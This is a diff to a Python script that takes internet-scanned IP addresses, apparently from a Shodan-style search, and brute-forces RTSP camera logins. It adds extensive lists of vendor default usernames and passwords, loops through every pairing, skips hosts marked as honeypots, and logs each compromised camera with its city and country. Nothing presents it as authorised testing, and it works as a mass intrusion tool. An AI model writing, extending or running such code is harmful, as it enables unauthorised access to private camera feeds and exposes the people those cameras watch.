@@ -59,24 +59,38 @@ def check_rtsp_auth(ip, credentials):
     return None
 
 def worker_thread(q, results_list, lock):
-    creds = ['', 'admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin']
+    usernames = ["", "admin", "Admin", "Administrator", "root", "supervisor", "ubnt", "service", "Dinion", "administrator", "admin1"]
+    passwords = ["", "admin", "9999", "123456", "pass", "camera", "1234", "12345", "fliradmin", "system", "jvc", "meinsm", "root", "4321", "111111", "1111111", "password", "ikwd", "supervisor", "ubnt", "wbox123", "service"]
+    
     while True:
         target = q.get()
         ip = target["ip_str"]
         
-        # Skip known honeypots
         if "honeypot" not in str(target):
-            auth = check_rtsp_auth(ip, creds)
-            if auth:
+            # Explicit nested loop to try each combination
+            found_auth = None
+            for u in usernames:
+                for p in passwords:
+                    # Construct the credential pair
+                    credential = f"{u}:{p}" if u else p
+                    
+                    # Probe with the current pair
+                    if check_rtsp_auth(ip, [credential]):
+                        found_auth = credential
+                        break # Exit password loop
+                if found_auth:
+                    break # Exit username loop
+
+            if found_auth:
                 with lock:
                     results_list.append({
                         "ip": ip, 
-                        "auth": auth, 
+                        "auth": found_auth, 
                         "city": target["location"].get("city", "N/A"),
                         "country": target["location"].get("country_name", "N/A")
                     })
         q.task_done()
-
+        
 # --- Main Logic ---
 def main():
     args = get_args()
